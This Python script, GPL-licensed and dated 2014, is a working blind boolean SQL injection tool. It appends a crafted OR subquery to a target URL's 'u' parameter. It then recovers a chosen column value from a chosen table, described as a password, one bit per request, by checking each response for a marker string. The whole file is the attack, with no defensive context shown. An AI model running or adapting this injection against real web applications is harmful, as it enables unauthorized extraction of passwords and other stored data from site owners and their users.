#!/usr/bin/env python3
#
#  -*- coding: utf8 -*-
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#  Copyright 2014 Yannick Méheut <useless (at) utouch (dot) fr>

import sys
import requests

def injection(target_url, string, column, table, where, index):
    '''
    This function will be performing the injection. It will find each
    character, bit by bit.
    * target_url: the URL where the injection will be performed
    * string: the string we'll look for for the binary search outcome
    The function will return the found password.
    '''

    print('[wait] retrieving data:', end='\t')
    sys.stdout.flush()
    data = ''
    i = 1

    # While we don't have the entire password
    while True:
        char = 0
        for j in range(1,8):
            # The injection performed here is URL-based
            # To use another mean of injection (HTTP Headers, Cookies...)
            # change the crafting between the hashtags

            #### CHANGE HERE
            if '?' in target_url:
                separator = '&'
            else:
                separator = '?'

            url = target_url + separator + "u=' OR " + \
                    "(select mid(lpad(bin(ord(mid({0},{1},1))),7,'0'),{2},1) " + \
                    "from {3} {4} " + \
                    "limit {5},1) = 1;-- &p=bla"
            url = url.format(column, i, j, table, where, index)

            r = requests.get(url)
            #### END OF CHANGE

            output = r.text

            # We seek which half of authorized_characters
            # we should search in
            if string in output:
                char += 2**(6 - j + 1)


        if char != 0:
            # When we find a character, we display it on stdout
            print(chr(char), end='')
            sys.stdout.flush()

            # We add it to the existing data
            data += chr(char)
            i += 1
        else:
            break

    print('\r[done]')

    return data

